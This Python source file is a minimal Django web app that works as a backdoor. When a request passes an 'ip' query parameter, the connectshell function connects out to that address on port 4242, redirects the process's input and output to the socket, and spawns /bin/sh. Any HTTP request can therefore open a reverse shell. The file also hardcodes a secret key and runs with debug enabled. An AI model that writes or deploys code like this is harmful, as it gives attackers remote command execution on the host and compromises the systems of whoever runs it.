from distutils.log import error
from re import A
import sys
from django.conf import settings
import socket,os,pty


settings.configure(
    DEBUG=True,
    SECRET_KEY='SomeKeyWhoKnowsWhat!',
    ROOT_URLCONF=__name__,
    MIDDLEWARE_CLASSES=(
        'django.middleware.common.CommonMiddleware',
        'django.middleware.csrf.CsrfViewMiddleware',
        'django.middleware.clickjacking.XFrameOptionsMiddleware',
    ),
)


from django.urls import include, re_path
from django.http import HttpResponse

def index(request):
    if ('ip' in request.GET):
        ip = request.GET['ip']
        e = connectshell(ip)
        return HttpResponse("Exception:" + str(e))
    else:
        return HttpResponse('Hello World!')

def connectshell(ip):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,4242))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        pty.spawn("/bin/sh")
        s.shutdown(socket.SHUT_RDWR)
        s.close()
    except Exception as e:
        return str(e)

urlpatterns = (
    re_path(r'^$', index),
)

if __name__ == "__main__":
    from django.core.management import execute_from_command_line
    execute_from_command_line(sys.argv)